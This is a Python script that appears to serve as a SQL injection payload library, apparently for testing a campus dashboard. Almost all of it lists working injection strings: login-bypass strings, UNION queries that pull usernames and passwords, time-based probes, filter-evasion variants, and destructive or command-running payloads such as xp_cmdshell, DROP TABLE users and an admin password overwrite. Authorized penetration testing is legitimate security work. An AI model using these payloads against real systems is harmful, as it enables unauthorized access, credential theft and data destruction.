#!/usr/bin/env python3
"""
SQL Injection Payload Generator
For testing Smart Campus Dashboard vulnerabilities
"""

# Common SQL Injection Payloads
SQL_INJECTION_PAYLOADS = {
    "authentication_bypass": [
        "admin' OR '1'='1",
        "admin' OR '1'='1' --",
        "admin' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 'x'='x",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "' OR '1'='1' --",
        "1' OR '1' = '1",
        "username=admin&password=' OR '1'='1"
    ],
    
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "1' UNION SELECT column_name,NULL FROM information_schema.columns--"
    ],
    
    "error_based": [
        "'",
        "''",
        "`",
        "``",
        ",",
        "\"",
        "\"\"",
        "/",
        "//",
        "\\",
        "\\\\",
        "' AND 1=CONVERT(int, (SELECT @@version))--"
    ],
    
    "time_based": [
        "'; WAITFOR DELAY '00:00:05'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1' AND BENCHMARK(5000000,MD5('test'))--"
    ],
    
    "data_extraction": [
        "' UNION SELECT username,password,email FROM users--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "' AND 1=0 UNION SELECT NULL,username,password FROM users--",
        "' UNION SELECT @@version,NULL,NULL--",
        "' UNION SELECT database(),user(),@@version--"
    ],
    
    "command_execution": [
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXEC sp_configure 'show advanced options', 1--",
        "1'; DROP TABLE users--",
        "1'; UPDATE users SET password='hacked' WHERE username='admin'--"
    ],
    
    "bypass_filters": [
        "admin'/**/OR/**/1=1--",
        "admin'/*comment*/OR/*comment*/1=1--",
        "a%64min' OR '1'='1",
        "aDmIn' oR '1'='1",
        "admin' || '1'=='1",
        "admin' /*!50000OR*/ '1'='1"
    ]
}

# URL-encoded versions for direct URL injection
URL_ENCODED_PAYLOADS = {
    "basic": [
        "id=1%27%20OR%20%271%27=%271",
        "username=admin%27%20OR%20%271%27=%271%27--",
        "search=%27%20UNION%20SELECT%20NULL,NULL,NULL--"
    ]
}

def get_payloads_by_type(payload_type):
    """Get payloads by category"""
    return SQL_INJECTION_PAYLOADS.get(payload_type, [])

def get_all_payloads():
    """Get all payloads"""
    all_payloads = []
    for category, payloads in SQL_INJECTION_PAYLOADS.items():
        all_payloads.extend(payloads)
    return all_payloads

def generate_custom_payload(username="admin", password="password"):
    """Generate custom authentication bypass payloads"""
    return [
        f"{username}' OR '1'='1",
        f"{username}' OR '1'='1' --",
        f"{username}' OR '1'='1' /*",
        f"username={username}&password=' OR '1'='1"
    ]

def print_all_payloads():
    """Print all payloads organized by category"""
    print("="*60)
    print("SQL INJECTION PAYLOAD LIBRARY")
    print("="*60)
    
    for category, payloads in SQL_INJECTION_PAYLOADS.items():
        print(f"\n[{category.upper()}]")
        print("-"*60)
        for i, payload in enumerate(payloads, 1):
            print(f"{i}. {payload}")
    
    print("\n" + "="*60)

if __name__ == "__main__":
    print_all_payloads()